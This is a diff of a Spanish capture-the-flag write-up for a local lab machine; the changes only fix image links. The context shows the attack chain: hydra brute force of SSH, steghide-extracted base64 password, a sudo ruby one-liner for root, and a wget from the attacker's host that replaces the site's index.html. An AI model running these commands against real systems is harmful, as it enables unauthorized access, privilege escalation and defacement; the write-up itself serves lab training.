@@ -1,5 +1,5 @@
 
-![[20250808115256.png]]
+![[20250808115256.png]](amor-images/20250808115256.png)
 
 # Fase de reconocimiento
 
@@ -15,17 +15,17 @@ Una vez tenemos los puertos abiertos vamos a realizar un segundo escaneo con scr
 nmap -p22,80 -sCV 172.17.0.2 -oN targeted
 ```
 
-![[20250808115450.png]]
+![[20250808115450.png]](amor-images/20250808115450.png)
 
 Una vez sabemos esto vamos a empezar la investigación por el puerto 80 la pagina web http 
 
-![[20250808115526.png]]
+![[20250808115526.png]](amor-images/20250808115526.png)
 
 a priori parece que es una especie de portal de comunicación entre los empleados de la empresa.
 
 Leyendo los mensajes podemos ver lo siguiente
 
-![[20250808115625.png]]
+![[20250808115625.png]](amor-images/20250808115625.png)
 
 Vemos que hay un usuario llamado Carlota, posteriormente vemos que se han detectado contraseñas vulnerables por lo que vamos a tratar de hacer un ataque de diccionario con hydra
 
@@ -43,7 +43,7 @@ asi que nos conectamos por ssh a carlota con la contraseña babygirl.
 ssh carlota@172.17.0.2
 ```
 
-![[20250808120136.png]]
+![[20250808120136.png]](amor-images/20250808120136.png)
 
 una vez estamos dentro como el sistema por defecto usa una sh vamos a cambiarla por una bash y vamos a exportar el TERM a xterm
 
@@ -65,7 +65,7 @@ como el usuario carlota probamos como siempre los siguientes comandos:
 sudo -l
 ```
 
-![[20250808120338.png]]
+![[20250808120338.png]](amor-images/20250808120338.png)
 
 no sacamos nada.
 
@@ -73,7 +73,7 @@ no sacamos nada.
 find / -perm -4000 2>/dev/null
 ```
 
-![[20250808120417.png]]
+![[20250808120417.png]](amor-images/20250808120417.png)
 
 no vemos nada interesante.
 
@@ -89,7 +89,7 @@ python3 -m http.server 8081
 
 2-desde la pagina web vamos a la Url `http://172.17.0.2:8081/imagen.jpg` y descargamos la imagen
 
-![[20250808120720.png]]
+![[20250808120720.png]](amor-images/20250808120720.png)
 
 una vez la tenemos en nuestra maquina atacante vamos a buscar metadatos
 
@@ -99,7 +99,7 @@ una vez la tenemos en nuestra maquina atacante vamos a buscar metadatos
 steghide info imagen.jpg
 ```
 
-![[20250808120914.png]]
+![[20250808120914.png]](amor-images/20250808120914.png)
 
 Nos solicitan un passphrase pulsamos enter sin poner nada ya que no solicita credenciales reales 
 
@@ -111,13 +111,13 @@ vemos que contiene un archivo llamado `secret.txt` asi que vamos a extraerlo
 ```bash
 steghide extract -sf imagen.jpg
 ```
-![[20250808121101.png]]
+![[20250808121101.png]](amor-images/20250808121101.png)
 
 a mi me pone que ya existe por que lo hice antes pero se debería descargar en vuestro equipo el archivo `seecret.txt`
 
 hacemos un cat para ver que contiene y descubrimos esto 
 
-![[20250808121150.png]]
+![[20250808121150.png]](amor-images/20250808121150.png)
 
 contiene un codigo en base64 que vamos a desencriptar para descubrir lo que oculta
 
@@ -125,11 +125,11 @@ contiene un codigo en base64 que vamos a desencriptar para descubrir lo que ocul
 echo 'ZXNsYWNhc2FkZXBpbnlwb24=' |base64 -d
 ```
 
-![[20250808121232.png]]
+![[20250808121232.png]](amor-images/20250808121232.png)
 
 tenemos una aparente contraseña `eslacasadepinypon` pero aun no sabemos donde usarla asi que vamos a seguir explorando con carlota el sistema
 
-![[20250808121336.png]]
+![[20250808121336.png]](amor-images/20250808121336.png)
 
 vemos que hay un usuario llamado oscar asi que vamos a probar si la contraseña le pertenece a el 
 
@@ -139,7 +139,7 @@ su oscar
 
 contraseña `eslacasadepinypon`
 
-![[20250808121426.png]]
+![[20250808121426.png]](amor-images/20250808121426.png)
 
 vemos que si, vamos a exportar la shell a una bash
 
@@ -157,11 +157,11 @@ sudo -l
 
 con la intención de ver si tenemos permisos de sudo en algún binario
 
-![[20250808121517.png]]
+![[20250808121517.png]](amor-images/20250808121517.png)
 
 vemos que tenemos permisos sudoers en el binario ruby asi que buscamos en GTFObins que podemos hacer
 
-![[20250808121605.png]]
+![[20250808121605.png]](amor-images/20250808121605.png)
 
 aqui vemos que con un sencillo codigo podemos escalar a root asi que vamos a probarlo 
 
@@ -169,7 +169,7 @@ aqui vemos que con un sencillo codigo podemos escalar a root asi que vamos a pro
 sudo ruby -e 'exec "/bin/bash"'
 ```
 
-![[20250808121723.png]]
+![[20250808121723.png]](amor-images/20250808121723.png)
 
 y conseguimos acceso como root
 
@@ -205,4 +205,4 @@ wget http://192.168.1.182:8081/index.html -O index.html && wget http://192.168.1
 
 ahora vamos a la pagina web al index.html recargamos la pagina y vemos nuestra firma
 
-![[20250808122216.png]]
+![[20250808122216.png]](amor-images/20250808122216.png)
